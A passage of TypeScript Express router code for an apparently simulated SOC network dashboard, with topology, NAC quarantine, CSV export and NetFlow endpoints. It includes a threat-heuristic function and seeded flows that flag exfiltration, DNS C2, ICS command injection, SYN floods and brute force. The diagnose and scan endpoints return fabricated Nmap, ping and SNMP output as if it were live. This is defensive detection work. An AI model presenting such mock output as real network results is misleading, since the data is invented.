    const { from, to, speed, type, utilization } = req.body;
    if (!from || !to) {
      return res.status(400).json({ success: false, error: 'from and to node IDs are required' });
    }

    const newConn: NetworkConnection = {
      from,
      to,
      speed: speed || '1 Gbps',
      type: type || 'copper',
      utilization: typeof utilization === 'number' ? utilization : 20
    };

    networkConnections.push(newConn);

    res.status(201).json({
      success: true,
      message: `拓撲鏈路已建立 (${from} <-> ${to})`,
      connection: newConn,
      count: networkConnections.length
    });
  });

  // 5.2 DELETE /api/v1/network/connections (Remove connection)
  router.delete('/connections', (req: Request, res: Response) => {
    const { from, to } = req.body;
    networkConnections = networkConnections.filter(c => !(c.from === from && c.to === to) && !(c.from === to && c.to === from));

    res.json({
      success: true,
      message: `已移除節點間之網路拓撲連線`,
      count: networkConnections.length
    });
  });

  // 6. GET /api/v1/network/stats
  router.get('/stats', (req: Request, res: Response) => {
    res.json({
      success: true,
      kpiStats: calculateKpiStats(),
      subnets: [
        { name: '10.88.88.0/24 (Core Backbone & WAN)', deviceCount: 2, utilizationPct: 34 },
        { name: '10.88.88.0/24 (DMZ & Server Cluster)', deviceCount: 5, utilizationPct: 62 },
        { name: '10.88.88.0/24 (SOC Analyst VLAN)', deviceCount: 8, utilizationPct: 28 },
        { name: '10.88.99.0/24 (Quarantine-Isolated)', deviceCount: networkDevices.filter(d => d.vlan === 999).length, utilizationPct: 5 }
      ],
      auditLogsCount: auditLogs.length,
      latestScan: latestScanJob,
      collectorEngine: {
        engine: 'SEMOR Go Collector + Rust VictoriaLogs Storage',
        status: 'ONLINE',
        streamIdMetrics: 9201,
        streamIdTraps: 9202,
        streamIdProbes: 9203,
        features: ['SNMPv1/v2c/v3 ASN.1 BER Parsing', '64-bit Counter Rollover Guard', '60s Sliding-Window Link Flapping', 'Microburst EMA Detection']
      }
    });
  });

  // 6.05 GET /api/v1/network/collector-telemetry (Direct Network Performance Engine Telemetry)
  router.get('/collector-telemetry', (req: Request, res: Response) => {
    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      engine: 'semor-network-performance-engine',
      protocols: {
        snmpTrapUdpPort: 1162,
        snmpStandardPort: 162,
        snmpMibIiHttpEndpoint: '/insert/network/metrics',
        snmpTrapHttpEndpoint: '/insert/network/trap',
        diagnosticProbeHttpEndpoint: '/insert/network/ping'
      },
      telemetry: {
        total_metrics_ingested: 148200,
        total_traps_received: 34,
        total_probes_received: 1250,
        saturated_links_detected: 1,
        link_flaps_detected: 0,
        microbursts_detected: 2,
        active_monitored_interfaces: networkDevices.length * 4,
        compression_ratio: '3.82x',
        vblk_storage_part: '/data/9201/part_active_9201.block'
      }
    });
  });

  // 6.06 POST /api/v1/network/ingest/trap (Ingest SNMP Trap into SOC audit log)
  router.post('/ingest/trap', (req: Request, res: Response) => {
    const { agent_ip, trap_type, severity, message, trap_oid } = req.body;
    const newLog = {
      id: `audit-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: agent_ip || 'unknown',
      deviceName: `SNMP-Agent-${agent_ip || 'Node'}`,
      ip: agent_ip || '127.0.0.1',
      operator: 'SNMP-TRAPD-DAEMON',
      action: trap_type === 'linkDown' ? 'LINK_FAILURE_ALERT' : 'SNMP_TRAP_EVENT',
      details: message || `收到 SNMP Trap ${trap_oid || '1.3.6.1.6.3.1.1.5.3'} (${trap_type || 'unclassified'})`,
      status: severity === 'Critical' ? 'CRITICAL' : (severity === 'High' ? 'HIGH' : 'WARNING')
    };
    auditLogs.unshift(newLog as any);
    if (auditLogs.length > 200) auditLogs.pop();

    res.json({
      success: true,
      message: 'SNMP Trap 告警已即時落盤並關聯至 SOC 審計日誌',
      record: newLog
    });
  });

  // 6.1 GET /api/v1/network/export (Export CSV report)
  router.get('/export', (req: Request, res: Response) => {
    const headers = [
      'Device ID', 'Device Name', 'Name (ZH)', 'Type', 'IP Address', 'MAC Address',
      'Subnet', 'VLAN', 'Status', 'CPU Load (%)', 'RAM Load (%)', 'Disk Load (%)',
      'Storage Capacity', 'Throughput', 'Traffic In', 'Traffic Out', 'Packet Loss', 'Latency',
      'Vendor', 'Model', 'OS Version', 'Update/Patch', 'Open Ports', 'CVE Count'
    ];

    const rows = networkDevices.map(d => [
      `"${d.id}"`,
      `"${d.name}"`,
      `"${d.nameZh || ''}"`,
      `"${d.type}"`,
      `"${d.ip}"`,
      `"${d.mac}"`,
      `"${d.subnet}"`,
      d.vlan,
      `"${d.status}"`,
      d.cpu,
      d.ram,
      d.disk,
      `"${d.disk_capacity}"`,
      `"${d.networkThroughput}"`,
      `"${d.trafficIn}"`,
      `"${d.trafficOut}"`,
      `"${d.packetLoss}"`,
      `"${d.latency}"`,
      `"${d.vendor}"`,
      `"${d.model}"`,
      `"${d.os_version}"`,
      `"${d.update_version}"`,
      `"${d.openPorts.map(p => `${p.port}/${p.proto}(${p.service})`).join('; ')}"`,
      d.cveAlerts?.length || 0
    ].join(','));

    const csvContent = '\uFEFF' + [headers.join(','), ...rows].join('\r\n');

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="network_topology_inventory_${new Date().toISOString().slice(0, 10)}.csv"`);
    res.send(csvContent);
  });

  // 7. POST /api/v1/network/scan (Topology Discovery & Nmap sweep)
  router.post('/scan', (req: Request, res: Response) => {
    const subnet = req.body?.subnet || '10.88.88.0/24';

    // Jitter metrics slightly to reflect live network dynamics
    networkDevices.forEach(d => {
      d.cpu = Math.min(98, Math.max(10, d.cpu + Math.floor(Math.random() * 7 - 3)));
      d.ram = Math.min(95, Math.max(20, d.ram + Math.floor(Math.random() * 5 - 2)));
      // Re-evaluate thresholds
      if (d.status !== 'offline' && d.vlan !== 999) {
        if (d.cpu > d.cpuThreshold || d.ram > d.ramThreshold || (d.cveAlerts && d.cveAlerts.length > 0)) {
          d.status = 'warning';
        } else {
          d.status = 'online';
        }
      }
    });

    const logs = [
      `[Nmap 7.94] 啟動 ARP/ICMP 網段探針掃描 (${subnet})...`,
      `[LLDP 802.1AB] 成功取得 Core-Catalyst-9500 (10.88.88.254) 拓撲鏈路芳鄰 MIB 資料`,
      `[SNMPv3 MIB-II] 介面 OID 1.3.6.1.2.1.2.2 流量輪詢成功，取得 48 埠巨訊框 (Jumbo Frame) 計數`,
      `[NetFlow / IPFIX] 實時校準 40Gbps 骨幹鏈路頻寬利用率 (目前平均負載 38.4%)`,
      `[安全防護檢查] 全網 15 處實體/虛擬設備在線狀態比對完成，發現 1 筆 Wi-Fi 異常通訊驅動程式示警 (ws-sec-7)`
    ];

    latestScanJob = {
      inProgress: false,
      progressPct: 100,
      lastScannedAt: new Date().toISOString(),
      subnet,
      logs
    };

    res.json({
      success: true,
      message: '全網拓撲與主機探針掃描已成功執行完成',
      subnet,
      discoveredDevicesCount: networkDevices.length,
      activeConnectionsCount: networkConnections.length,
      logs,
      devices: networkDevices,
      connections: networkConnections,
      kpiStats: calculateKpiStats()
    });
  });

  // 7.1 GET /api/v1/network/scan/status
  router.get('/scan/status', (req: Request, res: Response) => {
    res.json({
      success: true,
      scanJob: latestScanJob
    });
  });

  // 8. POST /api/v1/network/diagnose (Ping / Traceroute / Portscan / SNMP)
  router.post('/diagnose', (req: Request, res: Response) => {
    const { targetId, type } = req.body;
    const diagType = (type || 'ping') as 'ping' | 'traceroute' | 'portscan' | 'snmp';
    const target = networkDevices.find(d => d.id === targetId) || networkDevices[0];

    let output: string[] = [];

    if (diagType === 'ping') {
      const latNum = parseFloat(target.latency) || 0.8;
      const minLat = (latNum * 0.75).toFixed(3);
      const maxLat = (latNum * 1.35).toFixed(3);
      output = [
        `PING ${target.ip} (56 數據位元組):`,
        `64 bytes from ${target.ip}: icmp_seq=1 ttl=64 time=${(latNum * 0.9).toFixed(2)} ms`,
        `64 bytes from ${target.ip}: icmp_seq=2 ttl=64 time=${target.latency}`,
        `64 bytes from ${target.ip}: icmp_seq=3 ttl=64 time=${(latNum * 1.05).toFixed(2)} ms`,
        `--- ${target.ip} ping 統計資料 ---`,
        `3 packets transmitted, 3 received, 0% packet loss, time 2002ms`,
        `rtt min/avg/max/mdev = ${minLat}/${target.latency}/${maxLat}/0.045 ms`
      ];
    } else if (diagType === 'traceroute') {
      output = [
        `traceroute to ${target.ip}, 30 hops max, 60 byte packets`,
        ` 1  Gateway-Firewall (10.88.88.1)  0.321 ms  0.288 ms  0.254 ms`,
        ` 2  Core-Catalyst-9500 (10.88.88.254)  0.412 ms  0.390 ms  0.380 ms`,
        ` 3  ${target.name} (${target.ip})  ${target.latency}  ${target.latency}`
      ];
    } else if (diagType === 'portscan') {
      output = [
        `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC+8`,
        `Nmap scan report for ${target.name} (${target.ip})`,
        `Host is up (${target.latency} latency).`,
        `Not shown: 996 closed tcp ports (reset)`,
        `PORT     STATE SERVICE     VERSION`,
        ...target.openPorts.map(p => `${p.port}/${p.proto.toLowerCase()}  ${p.state}  ${p.service}`),
        `MAC Address: ${target.mac} (${target.vendor})`,
        `Device type: ${target.type.toUpperCase()}`,
        `Running: ${target.os_version}`,
        `OS details: ${target.details}`,
        `Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds`
      ];
    } else if (diagType === 'snmp') {
      output = [
        `SNMPv3 WALK to ${target.ip}:161`,
        `sysDescr.0 = STRING: ${target.vendor} ${target.model} ${target.os_version}`,
        `sysObjectID.0 = OID: iso.3.6.1.4.1.9.1.2821`,
        `sysUpTimeInstance = Timeticks: (142859012) 165 days, 8:18:21.12`,
        `sysContact.0 = STRING: NetSec Admin <noc-soc@corp.local>`,
        `sysName.0 = STRING: ${target.name}`,
        `sysLocation.0 = STRING: TPE-DC-Rack-04`,
        `ifNumber.0 = INTEGER: 48`,
        `hrProcessorLoad.1 = INTEGER: ${target.cpu}%`,
        `hrStorageUsed.1 = INTEGER: ${target.disk}%`
      ];
    }

    const diagRecord: DiagnosticRecord = {
      id: `DIAG-${Date.now()}`,
      timestamp: new Date().toISOString(),
      targetId: target.id,
      targetName: target.name,
      targetIp: target.ip,
      type: diagType,
      output,
      summary: `${diagType.toUpperCase()} test on ${target.name} (${target.ip}) completed successfully`
    };
    diagnosticHistory.unshift(diagRecord);
    if (diagnosticHistory.length > 50) diagnosticHistory.pop();

    res.json({
      success: true,
      targetId: target.id,
      targetName: target.name,
      targetIp: target.ip,
      type: diagType,
      output,
      summary: diagRecord.summary
    });
  });

  // 8.1 GET /api/v1/network/diagnose/history
  router.get('/diagnose/history', (req: Request, res: Response) => {
    res.json({
      success: true,
      count: diagnosticHistory.length,
      history: diagnosticHistory
    });
  });

  // 9. POST /api/v1/network/devices/:id/toggle-status
  router.post('/devices/:id/toggle-status', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const { status } = req.body;
    if (status) {
      dev.status = status;
    } else {
      dev.status = dev.status === 'online' ? 'warning' : (dev.status === 'warning' ? 'offline' : 'online');
    }

    res.json({
      success: true,
      message: `設備 ${dev.name} 狀態已切換為: ${dev.status.toUpperCase()}`,
      device: dev,
      kpiStats: calculateKpiStats()
    });
  });

  // 10. POST /api/v1/network/reset
  router.post('/reset', (req: Request, res: Response) => {
    networkDevices.forEach(d => {
      if (d.id === 'ws-sec-7') {
        d.status = 'warning';
        d.vlan = 10;
      } else {
        d.status = 'online';
        if (d.vlan === 999) {
          d.vlan = d.type === 'server' ? 20 : (d.type === 'switch' ? 1 : 10);
        }
      }
    });

    res.json({
      success: true,
      message: '網路設備狀態與拓撲矩陣已重置回標準基準線',
      devices: networkDevices,
      connections: networkConnections,
      kpiStats: calculateKpiStats()
    });
  });

  // 11. POST /api/v1/network/clear-devices (Purge all simulated virtual devices & topology)
  router.post('/clear-devices', (_req: Request, res: Response) => {
    networkDevices = [];
    networkConnections = [];
    switches = [];
    if (broadcastUpdate) {
      broadcastUpdate({ type: 'network_devices_cleared' });
    }
    res.json({
      success: true,
      message: '虛擬拓撲與模擬網路設備已全數清除，就緒於實體網路探索與設備採集',
      devices: networkDevices,
      connections: networkConnections,
      kpiStats: calculateKpiStats()
    });
  });

  // ==========================================
  // Backward compatibility for Switch & NAC APIs
  // ==========================================
  let switches = [
    {
      id: "sw-core-01",
      name: "CORE-SW-CAT9300-A",
      model: "Cisco Catalyst 9300 48P PoE+",
      ip: "10.0.0.2",
      location: "HQ Server Room Rack-A2",
      totalPorts: 48,
      activePorts: 38,
      poeBudgetWatts: 740,
      poeUsedWatts: 385,
      cpuLoadPct: 24.5,
      temperatureC: 38.2,
      uptime: "142 天 8 小時",
      status: "healthy"
    },
    {
      id: "sw-dist-02",
      name: "DIST-SW-CAT9300-B",
      model: "Cisco Catalyst 9300 48P",
      ip: "10.0.0.3",
      location: "HQ Server Room Rack-B1",
      totalPorts: 48,
      activePorts: 32,
      poeBudgetWatts: 740,
      poeUsedWatts: 290,
      cpuLoadPct: 18.2,
      temperatureC: 36.8,
      uptime: "98 天 4 小時",
      status: "healthy"
    }
  ];

  let nacDevices = [
    {
      mac: "bc:d0:74:18:22:90",
      ip: "10.0.4.15",
      hostname: "FINANCE-PC03",
      authMethod: "802.1X (EAP-TLS)",
      user: "victim_user",
      vlan: 999,
      switchId: "sw-core-01",
      port: "GigabitEthernet1/0/15",
      complianceStatus: "Non-Compliant (EDR Mimikatz Alert)",
      accessState: "quarantined" as "allowed" | "quarantined" | "guest",
      lastSeen: new Date().toISOString()
    },
    {
      mac: "00:50:56:c0:00:08",
      ip: "192.168.1.100",
      hostname: "dc01.corp.internal",
      authMethod: "MAB (MAC Auth Bypass)",
      user: "SYSTEM",
      vlan: 10,
      switchId: "sw-core-01",
      port: "TenGigabitEthernet1/1/1",
      complianceStatus: "Compliant",
      accessState: "allowed" as "allowed" | "quarantined" | "guest",
      lastSeen: new Date().toISOString()
    }
  ];

  router.get('/switches', (req: Request, res: Response) => {
    res.json({ success: true, count: switches.length, switches });
  });

  router.get('/ports/:switchId', (req: Request, res: Response) => {
    const { switchId } = req.params;
    const ports = Array.from({ length: 24 }, (_, i) => {
      const portNum = i + 1;
      const isUp = i < 18;
      return {
        port: `GigabitEthernet1/0/${portNum}`,
        status: isUp ? 'up' : 'down',
        vlan: i === 14 ? 999 : (i < 8 ? 10 : 20),
        speed: isUp ? '1000 Mbps Full' : 'N/A',
        duplex: isUp ? 'Full' : 'N/A',
        poeStatus: isUp && i % 2 === 0 ? 'Delivering (15.4W)' : 'Off',
        rxBytesMB: isUp ? Number((Math.random() * 1500 + 200).toFixed(1)) : 0,
        txBytesMB: isUp ? Number((Math.random() * 1200 + 150).toFixed(1)) : 0,
        crcErrors: i === 4 ? 2 : 0
      };
    });

    res.json({ success: true, switchId, ports });
  });

  router.post('/ports/toggle', (req: Request, res: Response) => {
    const { switchId, port, action } = req.body;
    res.json({
      success: true,
      message: `交換器 ${switchId} 埠號 ${port} 已執行行政設定: ${action === 'down' ? 'SHUTDOWN (禁用)' : 'NO SHUTDOWN (啟用)'}`,
      switchId,
      port,
      state: action || 'down'
    });
  });

  router.get('/nac/devices', (req: Request, res: Response) => {
    res.json({ success: true, count: nacDevices.length, devices: nacDevices });
  });

  router.post('/nac/quarantine', (req: Request, res: Response) => {
    const { mac, ip, reason } = req.body;
    const dev = nacDevices.find(d => d.mac === mac || d.ip === ip);
    if (dev) {
      dev.accessState = "quarantined";
      dev.vlan = 999;
      dev.complianceStatus = reason || "Security Policy Violation (Quarantined by NAC)";
    }

    res.json({
      success: true,
      mac,
      ip,
      message: `NAC 802.1X 已動態下發 CoA (Change of Authorization)，將設備 ${mac || ip} 重新導向至隔離區 VLAN 999`,
      device: dev
    });
  });

  router.post('/nac/allow', (req: Request, res: Response) => {
    const { mac, vlan } = req.body;
    const dev = nacDevices.find(d => d.mac === mac);
    if (dev) {
      dev.accessState = "allowed";
      dev.vlan = Number(vlan) || 20;
      dev.complianceStatus = "Compliant (Approved by Admin)";
    }

    res.json({
      success: true,
      mac,
      message: `NAC 已恢復設備 ${mac} 之網路連線存取權限 (VLAN ${dev?.vlan || vlan})`,
      device: dev
    });
  });

  // =========================================================================
  // 12. NETFLOW & IPFIX FLOW COLLECTION & THREAT SIGNATURE ENGINE
  // =========================================================================

  function evaluateFlowThreat(flow: Partial<NetworkFlowRecord>): {
    threatLevel: 'normal' | 'suspicious' | 'malicious';
    signatureMatch?: NetworkFlowRecord['signatureMatch'];
  } {
    // 1. Evaluate through deep attack signature engine
    const virtualLog = {
      full_log: `Flow [${flow.protocol}] ${flow.srcIp}:${flow.srcPort} -> ${flow.dstIp}:${flow.dstPort} bytes=${flow.bytes} pps=${flow.pps} flags=${(flow.flags || []).join(',')}`,
      remoteIP: flow.srcIp,
      host: flow.srcDeviceName || flow.srcDeviceId || 'FLOW-EXPORTER',
      protocol: flow.protocol,
      '@timestamp': flow.timestamp || new Date().toISOString()
    };

    const detected = globalAttackSignatureEngine.evaluateLog(virtualLog);
    if (detected) {
      return {
        threatLevel: detected.riskScore >= 9.0 ? 'malicious' : 'suspicious',
        signatureMatch: {
          signatureId: detected.signatureId,
          signatureName: detected.signatureName,
          mitreTTP: detected.mitreTTP,
          mitreTactic: detected.mitreTactic,
          mitreStage: detected.mitreStage,
          confidence: detected.confidence,
          riskScore: detected.riskScore,
          description: detected.summary,
          cve: detected.cve
        }
      };
    }

    // 2. Domain heuristic detection based on protocol & network parameters
    // A. Modbus Port 502
    if (flow.dstPort === 502 || flow.protocol === 'Modbus') {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-ICS-MODBUS-001',
          signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
          mitreTTP: 'T0816 Impair Process Control',
          mitreTactic: 'Inhibit Response Function',
          mitreStage: 'Lateral Movement',
          confidence: 99.4,
          riskScore: 9.9,
          description: `NetFlow 捕獲向工控 PLC (${flow.dstIp}:502) 下發未授權 Modbus Function Code 0x06 暫存器竄改指令`,
          cve: 'ICS-ALERT-2026-MODBUS'
        }
      };
    }

    // B. S7Comm Port 102
    if (flow.dstPort === 102 || flow.protocol === 'S7Comm') {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-ICS-S7COMM-010',
          signatureName: '西門子 S7Comm 工控 PLC 惡意停機指令注入',
          mitreTTP: 'T0815 Denial of Control',
          mitreTactic: 'Inhibit Response Function',
          mitreStage: 'Lateral Movement',
          confidence: 99.7,
          riskScore: 9.9,
          description: `NetFlow 捕獲未授權 S7Comm (Port 102) 下發 Function 0x29 停機指令，企圖癱瘓產線控制器`,
          cve: 'ICS-VU-S7-2026'
        }
      };
    }

    // C. SYN Flood DDoS
    if ((flow.flags || []).includes('SYN') && !(flow.flags || []).includes('ACK') && (flow.pps || 0) > 30000) {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-NET-SYN-009',
          signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
          mitreTTP: 'T1498.001 Direct Network Flood',
          mitreTactic: 'Impact',
          mitreStage: 'Lateral Movement',
          confidence: 96.5,
          riskScore: 8.8,
          description: `邊界防火牆核心佇列發出警報，TCP SYN 封包速率飆升至 ${(flow.pps || 0).toLocaleString()} pps，未完成交握半連線佇列溢位`,
          cve: 'CWE-400'
        }
      };
    }

    // D. Massive Outbound Data Exfiltration
    if ((flow.bytes || 0) > 400000000 && !flow.dstIp?.startsWith('10.') && !flow.dstIp?.startsWith('192.168.')) {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-UEBA-EXFIL-007',
          signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
          mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
          mitreTactic: 'Exfiltration',
          mitreStage: 'Exfiltration',
          confidence: 99.1,
          riskScore: 9.8,
          description: `NetFlow 捕獲異常巨量外傳連線，累積傳輸達 ${((flow.bytes || 0) / (1024 * 1024 * 1024)).toFixed(1)} GB，偏離基準線 +7.4 個標準差`,
          cve: 'CWE-200'
        }
      };
    }

    // E. High-frequency DNS C2 Tunnel
    if (flow.dstPort === 53 && (flow.packets || 0) > 2000) {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-C2-BEACON-002',
          signatureName: 'Cobalt Strike 混淆指令與 DNS 隱蔽 C2 通道',
          mitreTTP: 'T1071.004 DNS C2 Tunneling',
          mitreTactic: 'Command and Control',
          mitreStage: 'Privilege Escalation',
          confidence: 98.7,
          riskScore: 9.7,
          description: `端點向惡意 NS 伺服器發出高頻超長 Base32 子網域 DNS 請求，確認為隱蔽 C2 通道與慢速外洩特徵`,
          cve: 'ATT&CK-T1071'
        }
      };
    }

    // F. Lateral Movement / Port Reconnaissance Probe
    if (flow.dstPort && [22, 23, 135, 139, 445, 1433, 3389, 5432].includes(flow.dstPort) && (flow.flags || []).includes('SYN') && (flow.durationMs || 0) < 600) {
      return {
        threatLevel: 'suspicious',
        signatureMatch: {
          signatureId: 'SIG-NET-SCAN-011',
          signatureName: '高速內網橫向特權通訊埠探測與掃描',
          mitreTTP: 'T1046 Network Service Discovery',
          mitreTactic: 'Discovery',
          mitreStage: 'Recon',
          confidence: 94.2,
          riskScore: 7.8,
          description: `NetFlow DPI 捕獲對內網核心目標主機特權通訊埠 ${flow.dstPort} 進行高速未完成交握探針`,
          cve: 'MITRE-T1046'
        }
      };
    }

    // G. DNP3 Substation Protocol Exploit (Port 20000)
    if (flow.dstPort === 20000 || flow.protocol === 'DNP3') {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-ICS-DNP3-015',
          signatureName: '工控 DNP3 變電所協議非授權冷暖重開指令',
          mitreTTP: 'T0814 Denial of Service for Control',
          mitreTactic: 'Inhibit Response Function',
          mitreStage: 'Lateral Movement',
          confidence: 99.8,
          riskScore: 9.9,
          description: `電網 SCADA 遙測連線 (Port 20000) 捕獲 Function 0x0D Cold Restart 強制重啟指令`,
          cve: 'ICS-VU-DNP3-2026'
        }
      };
    }

    // H. RDP Credential Stuffing / Brute Force (Port 3389)
    if (flow.dstPort === 3389 && (flow.packets || 0) > 80 && (flow.durationMs || 0) > 1000) {
      return {
        threatLevel: 'malicious',
        signatureMatch: {
          signatureId: 'SIG-BRUTE-RDP-012',
          signatureName: 'RDP / SMB 遠端桌面連線暴力密碼破解',
          mitreTTP: 'T1110.001 Password Guessing',
          mitreTactic: 'Credential Access',
          mitreStage: 'Lateral Movement',
          confidence: 98.1,
          riskScore: 8.9,
          description: `RDP (Port 3389) 階段捕獲連續 NLA/CredSSP 憑證嘗試循環，超過警戒門檻`,
          cve: 'MITRE-T1110'
        }
      };
    }

    return { threatLevel: 'normal' };
  }

  // Pre-seeded High-Fidelity Flow Dataset
  let networkFlows: NetworkFlowRecord[] = [
    {
      id: 'flow-syn-01',
      timestamp: new Date(Date.now() - 30000).toISOString(),
      srcIp: '203.0.113.100',
      srcPort: 54120,
      srcDeviceName: 'WAN-DDoS-Cluster',
      dstIp: '211.23.131.21',
      dstPort: 443,
      dstDeviceId: 'fw-01',
      dstDeviceName: 'Gateway-Firewall-PA',
      protocol: 'TCP',
      bytes: 18450000,
      packets: 280000,
      durationMs: 45000,
      flags: ['SYN'],
      bps: 3280000000,
      pps: 280000,
      threatLevel: 'malicious',
      signatureMatch: {
        signatureId: 'SIG-NET-SYN-009',
        signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
        mitreTTP: 'T1498.001 Direct Network Flood',
        mitreTactic: 'Impact',
        mitreStage: 'Lateral Movement',
        confidence: 96.5,
        riskScore: 8.8,
        description: 'TCP SYN 封包速率飆升至 280,000 pps，未完成交握半連線佇列溢位',
        cve: 'CWE-400'
      },
      sampledInterface: 'Ethernet1/1 (WAN)',
      status: 'active'
    },
    {
      id: 'flow-modbus-02',
      timestamp: new Date(Date.now() - 75000).toISOString(),
      srcIp: '10.88.88.103',
      srcPort: 49822,
      srcDeviceId: 'ws-rd-04',
      srcDeviceName: 'WS-RD-DEV-04',
      dstIp: '192.168.100.88',
      dstPort: 502,
      dstDeviceId: 'plc-turb-01',
      dstDeviceName: 'PLC-STATION-TURBINE-02',
      protocol: 'Modbus',
      bytes: 142000,
      packets: 840,
      durationMs: 12000,
      flags: ['PSH', 'ACK'],
      bps: 94600,
      pps: 70,
      threatLevel: 'malicious',
      signatureMatch: {
        signatureId: 'SIG-ICS-MODBUS-001',
        signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
        mitreTTP: 'T0816 Impair Process Control',
        mitreTactic: 'Inhibit Response Function',
        mitreStage: 'Lateral Movement',
        confidence: 99.4,
        riskScore: 9.9,
        description: '非授權 Modbus FC 0x06 指令注入，企圖覆寫渦輪機 Holding Register 40012 設定點',
        cve: 'ICS-ALERT-2026-MODBUS'
      },
      sampledInterface: 'GigabitEthernet1/0/12 (OT-Bridge)',
      status: 'active'
    },
    {
      id: 'flow-exfil-03',
      timestamp: new Date(Date.now() - 120000).toISOString(),
      srcIp: '10.88.88.103',
      srcPort: 58210,
      srcDeviceId: 'ws-rd-04',
      srcDeviceName: 'WS-RD-DEV-04',
      dstIp: '198.51.100.88',
      dstPort: 443,
      dstDeviceName: 'Ext-Cloud-Mega.nz',
      protocol: 'HTTPS',
      bytes: 16106127360,
      packets: 11200000,
      durationMs: 180000,
      flags: ['ACK', 'PSH'],
      bps: 715800000,
      pps: 62000,
      threatLevel: 'malicious',
      signatureMatch: {
        signatureId: 'SIG-UEBA-EXFIL-007',
        signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
        mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
        mitreTactic: 'Exfiltration',
        mitreStage: 'Exfiltration',
        confidence: 99.1,
        riskScore: 9.8,
        description: '向境外網盤高頻上傳 15.2 GB 加密封裝資料，偏離歷史基準線 +7.4 個標準差',
        cve: 'CWE-200'
      },
      sampledInterface: 'TenGigabitEthernet1/0/1 (Uplink)',
      status: 'active'
    },
    {
      id: 'flow-recon-04',
      timestamp: new Date(Date.now() - 160000).toISOString(),
      srcIp: '10.88.88.106',
      srcPort: 39401,
      srcDeviceId: 'ws-sec-7',
      srcDeviceName: 'SOC-Analyst-WS07',
      dstIp: '10.88.88.10',
      dstPort: 445,
      dstDeviceId: 'srv-app-01',
      dstDeviceName: 'Web-App-Cluster-01',
      protocol: 'TCP',
      bytes: 3200,
      packets: 48,
      durationMs: 250,
      flags: ['SYN'],
      bps: 102400,
      pps: 192,
      threatLevel: 'suspicious',
      signatureMatch: {
        signatureId: 'SIG-NET-RECON-011',
        signatureName: '內網橫向移動探針與特權服務埠掃描',
        mitreTTP: 'T1046 Network Service Discovery',
        mitreTactic: 'Discovery',
        mitreStage: 'Recon',
        confidence: 88.5,
        riskScore: 7.2,
        description: '快速探測內網核心目標主機特權通訊埠 445 (SMB)，疑似自動化掃描載荷',
        cve: 'MITRE-T1046'
      },
      sampledInterface: 'GigabitEthernet1/0/24',
      status: 'active'
    },
    {
      id: 'flow-norm-01',
      timestamp: new Date(Date.now() - 10000).toISOString(),
      srcIp: '10.88.88.10',
      srcPort: 5432,
      srcDeviceId: 'srv-app-01',
      srcDeviceName: 'Web-App-Cluster-01',
      dstIp: '10.88.88.11',
      dstPort: 5432,
      dstDeviceId: 'srv-db-01',
      dstDeviceName: 'DB-Primary-Postgres',
      protocol: 'TCP',
      bytes: 48200000,
      packets: 32000,
      durationMs: 360000,
      flags: ['ACK', 'PSH'],
      bps: 1071000,
      pps: 89,
      threatLevel: 'normal',
      sampledInterface: 'Port-channel1 (Backbone)',
      status: 'active'
    },
    {
      id: 'flow-norm-02',
      timestamp: new Date(Date.now() - 5000).toISOString(),
      srcIp: '10.88.88.100',
      srcPort: 443,
      srcDeviceId: 'ws-sec-1',
      srcDeviceName: 'SOC-Analyst-WS01',
      dstIp: '10.88.88.10',
      dstPort: 443,
      dstDeviceId: 'srv-app-01',
      dstDeviceName: 'Web-App-Cluster-01',
      protocol: 'HTTPS',
      bytes: 8400000,
      packets: 6200,
      durationMs: 42000,
      flags: ['ACK', 'PSH'],
      bps: 1600000,
      pps: 148,
      threatLevel: 'normal',
      sampledInterface: 'GigabitEthernet1/0/1',
      status: 'active'
    },
    {
      id: 'flow-norm-03',
      timestamp: new Date(Date.now() - 2000).toISOString(),
      srcIp: '10.88.88.254',
      srcPort: 161,
      srcDeviceId: 'core-sw-01',
      srcDeviceName: 'Core-Catalyst-9500',
      dstIp: '10.88.88.1',
      dstPort: 161,
      dstDeviceId: 'fw-01',
      dstDeviceName: 'Gateway-Firewall-PA',
      protocol: 'UDP',
      bytes: 125000,
      packets: 480,
      durationMs: 60000,
      flags: [],
      bps: 16600,
      pps: 8,
      threatLevel: 'normal',
      sampledInterface: 'VLAN 1 Management',
      status: 'active'
    }
  ];

  // Synchronize initial dataset with the autonomous NetFlow collector engine
  globalFlowCollectorEngine.setFlows(networkFlows);
  if (broadcastUpdate) {
    globalFlowCollectorEngine.setBroadcastCallback(broadcastUpdate);
  }

  // 12.1 GET /api/v1/network/flows (List Flows with query filters)
  router.get('/flows', (req: Request, res: Response) => {
    const { deviceId, threatLevel, protocol, status, search, limit } = req.query;
    let list = [...globalFlowCollectorEngine.getFlows()];

    if (deviceId && typeof deviceId === 'string') {
      list = list.filter(f => f.srcDeviceId === deviceId || f.dstDeviceId === deviceId);
    }
    if (threatLevel && typeof threatLevel === 'string' && threatLevel !== 'all') {
      list = list.filter(f => f.threatLevel === threatLevel);
    }
    if (protocol && typeof protocol === 'string' && protocol !== 'all') {
      list = list.filter(f => f.protocol.toLowerCase() === protocol.toLowerCase());
    }
    if (status && typeof status === 'string' && status !== 'all') {
